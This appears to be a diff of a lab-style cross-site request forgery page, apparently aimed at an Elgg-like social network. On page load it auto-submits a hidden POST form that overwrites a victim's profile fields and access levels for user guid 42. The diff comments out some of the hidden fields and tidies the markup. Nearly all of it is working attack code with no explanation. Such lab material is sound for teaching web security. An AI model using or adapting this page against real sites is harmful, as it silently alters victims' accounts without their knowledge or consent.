@@ -3,7 +3,7 @@
     <title>Web Site</title>
   </head>
   <body>
-    This is a POST puest!
+    <h1>This is a POST request!</h1>
     <script type="text/javascript">
       function post(url, fields){
   
@@ -28,29 +28,31 @@
   
         fields += "<input type='hidden' name='briefdescription' value=''>";
         fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
-        fields += "<input type='hidden' name='contactemail' value=''>";
-        fields += "<input type='hidden' name='accesslevel[contactemail]' value='2'>";
-        fields += "<input type='hidden' name='interests' value=''>";
-        fields += "<input type='hidden' name='accesslevel[interests]' value='2'>";
+        // fields += "<input type='hidden' name='contactemail' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[contactemail]' value='2'>";
+        // fields += "<input type='hidden' name='interests' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[interests]' value='2'>";
         fields += "<input type='hidden' name='location' value=''>";
         fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
-        fields += "<input type='hidden' name='mobile' value=''>";
-        fields += "<input type='hidden' name='accesslevel[mobile]' value='2'>";
-        fields += "<input type='hidden' name='phone' value=''>";
-        fields += "<input type='hidden' name='accesslevel[phone]' value='2'>";
-        fields += "<input type='hidden' name='skills' value=''>";
-        fields += "<input type='hidden' name='accesslevel[skills]' value='2'>";
-        fields += "<input type='hidden' name='twitter' value=''>";
-        fields += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
-        fields += "<input type='hidden' name='website' value=''>";
-        fields += "<input type='hidden' name='accesslevel[website]' value='2'>";
+        // fields += "<input type='hidden' name='mobile' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[mobile]' value='2'>";
+        // fields += "<input type='hidden' name='phone' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[phone]' value='2'>";
+        // fields += "<input type='hidden' name='skills' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[skills]' value='2'>";
+        // fields += "<input type='hidden' name='twitter' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[twitter]' value='2'>";
+        // fields += "<input type='hidden' name='website' value=''>";
+        // fields += "<input type='hidden' name='accesslevel[website]' value='2'>";
   
         fields += "<input type='hidden' name='guid' value='42'>";
 
         post(url, fields);
       }
   
-      window.onload = function() { csrf(); }
+      window.onload = function(){
+        csrf();
+      }
     </script>
   </body>
 </html>
